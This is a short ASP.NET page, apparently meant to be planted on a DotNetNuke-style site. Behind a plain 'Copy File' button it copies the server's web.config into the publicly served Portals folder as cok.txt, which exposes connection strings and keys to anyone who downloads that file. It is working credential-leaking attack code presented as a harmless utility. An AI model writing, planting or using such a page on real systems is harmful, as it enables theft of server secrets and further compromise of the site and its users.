<%@ Page Language="C#" %>

<!DOCTYPE html>

<script runat="server">
    protected void btnCopyFile_Click(object sender, EventArgs e)
    {
        string sourcePath = Server.MapPath("~/web.config");
        string destinationPath = Server.MapPath("~/Portals/cok.txt");

        try
        {
            // Copy the file
            System.IO.File.Copy(sourcePath, destinationPath, true);

            // Provide feedback to the user
            lblStatus.Text = "File copied successfully!";
        }
        catch (Exception ex)
        {
            // Handle any errors that occur during the file copy process
            lblStatus.Text = "Error: " + ex.Message;
        }
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>cp</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:Button ID="btnCopyFile" runat="server" Text="Copy File" OnClick="btnCopyFile_Click" />
            <br />
            <asp:Label ID="lblStatus" runat="server" Text=""></asp:Label>
        </div>
    </form>
</body>
</html>
